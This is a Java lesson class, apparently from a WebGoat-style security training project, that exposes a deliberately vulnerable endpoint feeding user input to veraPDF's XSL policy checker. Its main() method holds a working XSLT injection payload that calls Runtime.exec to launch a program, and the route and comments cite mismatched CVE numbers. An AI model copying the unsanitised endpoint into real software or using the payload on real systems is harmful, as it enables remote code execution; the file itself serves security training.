/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.ossverapdfcorejakarta;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.verapdf.core.VeraPDFException;
import org.verapdf.policy.PolicyChecker;

@RestController
@AssignmentHints({"vulnerable-verapdf.hint"})
public class VulnerableVeraPdfCoreJakartaComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(this.getClass().getName());

  @PostMapping("/VulnerableVeraPdfCoreJakartaComponents/CVE-2024-27348")
  public @ResponseBody AttackResult NacosYamlParser(
      @RequestParam String payload,
      @RequestParam(required = false, defaultValue = "false") Boolean isXsl) {
    ////		https://security.snyk.io/vuln/SNYK-JAVA-ORGVERAPDF-6513793  - CVE-2024-28109

    log.info("VulnerableVeraPdfCoreJakartaComponents called with payload : {}", payload);
    try {

      InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
      OutputStream policyResultOss =
          new OutputStream() {
            StringBuilder sb = new StringBuilder();

            @Override
            public void write(int b) throws IOException {
              this.sb.append((char) b);
            }

            public String toString() {
              return this.sb.toString();
            }
          };
      PolicyChecker.applyPolicy(
          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
          is,
          policyResultOss,
          isXsl);

      if (policyResultOss.toString().contains("pid")) {
        return success(this)
            .feedback("vulnerable-verapdf-components.success")
            .output(policyResultOss.toString())
            .build();
      }
      //			obj.get("docmuemtn)
    } catch (VeraPDFException ex) {
      return success(this)
          .feedback("vulnerable-verapdf-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-verapdf-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-verapdf-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  public static void main(String[] args) {
    //	String payload="";
    String payload =
        "<xsl:stylesheet version=\"1.0\"\r\n"
            + "	xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\r\n"
            + "	xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"\r\n"
            + "	xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\">\r\n"
            + "	<xsl:template match=\"/\">\r\n"
            + "		<xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\" />\r\n"
            + "		<xsl:variable name=\"process\" select=\"rt:exec($rtobject,'calc')\" />\r\n"
            + "		<xsl:variable name=\"processString\"	select=\"ob:toString($process)\" />\r\n"
            + "		<xsl:value-of select=\"$processString\" />\r\n"
            + "	</xsl:template>\r\n"
            + "</xsl:stylesheet>";
    boolean isXsl = true;
    InputStream is = new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8));
    OutputStream policyResultOss =
        new OutputStream() {
          StringBuilder sb = new StringBuilder();

          @Override
          public void write(int b) throws IOException {
            this.sb.append((char) b);
          }

          public String toString() {
            return this.sb.toString();
          }
        };
    try {
      PolicyChecker.applyPolicy(
          new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
          is,
          policyResultOss,
          isXsl);
    } catch (VeraPDFException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }

    System.out.println(" Output ---> " + policyResultOss);
    //	payload = "<demo><demo>";

  }
}
